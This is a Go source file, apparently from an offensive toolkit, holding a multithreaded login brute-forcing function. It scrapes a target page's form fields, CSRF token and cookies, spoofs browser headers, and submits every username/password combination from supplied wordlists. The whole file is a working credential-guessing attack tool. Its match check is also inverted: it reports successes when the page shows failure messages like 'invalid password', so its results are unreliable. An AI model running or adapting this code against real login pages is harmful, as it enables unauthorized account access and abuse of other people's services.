package identitymanagement

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
)

func ErrorMessageEnum(loginURL, userListPath, passListPath string, threads int) {
	// Step 1: Add https if no protocol
	if !strings.HasPrefix(loginURL, "http://") && !strings.HasPrefix(loginURL, "https://") {
		loginURL = "https://" + loginURL
	}

	// Step 2: Gather page's HTML content
	resp, err := http.Get(loginURL)
	if err != nil {
		fmt.Printf("Error fetching URL: %v\n", err)
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("Error reading response: %v\n", err)
		return
	}
	htmlContent := string(body)

	// Step 3: Extract form action and method
	formRegex := regexp.MustCompile(`(?is)<form[^>]*>(.*?)</form>`)
	formMatch := formRegex.FindStringSubmatch(htmlContent)
	if formMatch == nil {
		fmt.Println("No form found on the page")
		return
	}
	formContent := formMatch[0]

	action := extractErrorAttribute(formContent, "action")
	if action == "" {
		action = "/"
	}

	method := strings.ToUpper(extractErrorAttribute(formContent, "method"))
	if method == "" {
		method = "GET"
	}

	// Step 4: Create full action URL
	parsedURL, _ := url.Parse(loginURL)
	baseURL := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)

	var fullAction string
	if strings.HasPrefix(action, "http://") || strings.HasPrefix(action, "https://") {
		fullAction = action
	} else if strings.HasPrefix(action, "/") {
		fullAction = baseURL + action
	} else {
		fullAction = baseURL + "/" + action
	}

	// Step 5: Extract username field
	usernameField := findErrorInputField(formContent, []string{"user", "username", "login", "email"})
	if usernameField == "" {
		usernameField = "username"
	}

	// Step 6: Extract password field
	passwordField := findErrorInputField(formContent, []string{"pass", "password", "pwd"})
	if passwordField == "" {
		passwordField = "password"
	}

	// Step 7: Extract CSRF field and value
	csrfField := ""
	csrfValue := ""
	csrfRegex := regexp.MustCompile(`(?i)<input[^>]*name=["']([^"']*(?:csrf|token|nonce)[^"']*)["'][^>]*value=["']([^"']*)["'][^>]*>|<input[^>]*value=["']([^"']*)["'][^>]*name=["']([^"']*(?:csrf|token|nonce)[^"']*)["'][^>]*>`)
	csrfMatch := csrfRegex.FindStringSubmatch(formContent)
	if csrfMatch != nil {
		if csrfMatch[1] != "" {
			csrfField = csrfMatch[1]
			csrfValue = csrfMatch[2]
		} else {
			csrfField = csrfMatch[4]
			csrfValue = csrfMatch[3]
		}
	}

	// Step 9: Extract cookies
	cookies := ""
	for _, cookie := range resp.Cookies() {
		if cookies != "" {
			cookies += "; "
		}
		cookies += cookie.Name + "=" + cookie.Value
	}

	// Step 10 & 11: Set headers
	headers := map[string]string{
		"Content-Type":              "application/x-www-form-urlencoded",
		"User-Agent":                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"Accept-Language":           "en-US,en;q=0.5",
		"Accept-Encoding":           "gzip, deflate",
		"Connection":                "keep-alive",
		"Upgrade-Insecure-Requests": "1",
		"Referer":                   loginURL,
	}
	if cookies != "" {
		headers["Cookie"] = cookies
	}

	// Load user and password lists
	usernames := loadErrorFile(userListPath)
	passwords := loadErrorFile(passListPath)

	fmt.Printf("Threads number: %d\n", threads)
	fmt.Printf("Starting fuzzing on %s\n", fullAction)
	fmt.Printf("Method: %s\n", method)
	fmt.Printf("Username field: %s\n", usernameField)
	fmt.Printf("Password field: %s\n", passwordField)
	if csrfField != "" {
		fmt.Printf("CSRF field: %s = %s\n", csrfField, csrfValue)
	}
	fmt.Println("---")

	// Error message patterns to match
	errorPatterns := []string{
		"invalid username",
		"invalid password",
		"login failed",
		"authentication failed",
		"unauthorized",
		"access denied",
		"نام کاربری یا رمز عبور معتبر نیست",
	}

	// Step 12: Begin fuzzing with concurrency
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return nil // Follow redirects
		},
	}

	// Create a semaphore channel to limit concurrent requests
	semaphore := make(chan struct{}, threads)
	var wg sync.WaitGroup

	for _, username := range usernames {
		for _, password := range passwords {
			wg.Add(1)
			semaphore <- struct{}{} // Acquire semaphore

			go func(user, pass string) {
				defer wg.Done()
				defer func() { <-semaphore }() // Release semaphore

				// Step 8: Construct data
				data := fmt.Sprintf("%s=%s&%s=%s", usernameField, url.QueryEscape(user), passwordField, url.QueryEscape(pass))
				if csrfField != "" && csrfValue != "" {
					data = fmt.Sprintf("%s=%s&%s", csrfField, url.QueryEscape(csrfValue), data)
				}

				var req *http.Request
				if method == "GET" {
					targetURL := fullAction + "?" + data
					req, _ = http.NewRequest("GET", targetURL, nil)
				} else {
					req, _ = http.NewRequest("POST", fullAction, strings.NewReader(data))
				}

				// Add headers
				for key, value := range headers {
					req.Header.Set(key, value)
				}

				resp, err := client.Do(req)
				if err != nil {
					return
				}
				defer resp.Body.Close()

				// Read response body
				body, err := io.ReadAll(resp.Body)
				if err != nil {
					return
				}
				responseBody := strings.ToLower(string(body))

				// Check for status code 200 OR error messages
				statusMatch := resp.StatusCode == 200
				errorMatch := false

				for _, pattern := range errorPatterns {
					if strings.Contains(responseBody, strings.ToLower(pattern)) {
						errorMatch = true
						break
					}
				}

				if statusMatch || errorMatch {
					result := fmt.Sprintf("[+] Match found: %s:%s", user, pass)
					if statusMatch {
						result += " (Status: 200)"
					}
					if errorMatch {
						result += " (Error message detected)"
					}
					fmt.Println(result)
				}
			}(username, password)
		}
	}

	wg.Wait()
	fmt.Println("Error message enumeration complete")
}

func extractErrorAttribute(html, attr string) string {
	re := regexp.MustCompile(fmt.Sprintf(`(?i)%s=["']([^"']*)["']`, attr))
	match := re.FindStringSubmatch(html)
	if match != nil {
		return match[1]
	}
	return ""
}

func findErrorInputField(formContent string, keywords []string) string {
	inputRegex := regexp.MustCompile(`(?i)<input[^>]*name=["']([^"']*)["'][^>]*>`)
	matches := inputRegex.FindAllStringSubmatch(formContent, -1)

	for _, match := range matches {
		fieldName := match[1]
		for _, keyword := range keywords {
			if strings.Contains(strings.ToLower(fieldName), keyword) {
				return fieldName
			}
		}
	}
	return ""
}

func loadErrorFile(path string) []string {
	file, err := os.Open(path)
	if err != nil {
		fmt.Printf("Error opening file %s: %v\n", path, err)
		os.Exit(1)
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines
}
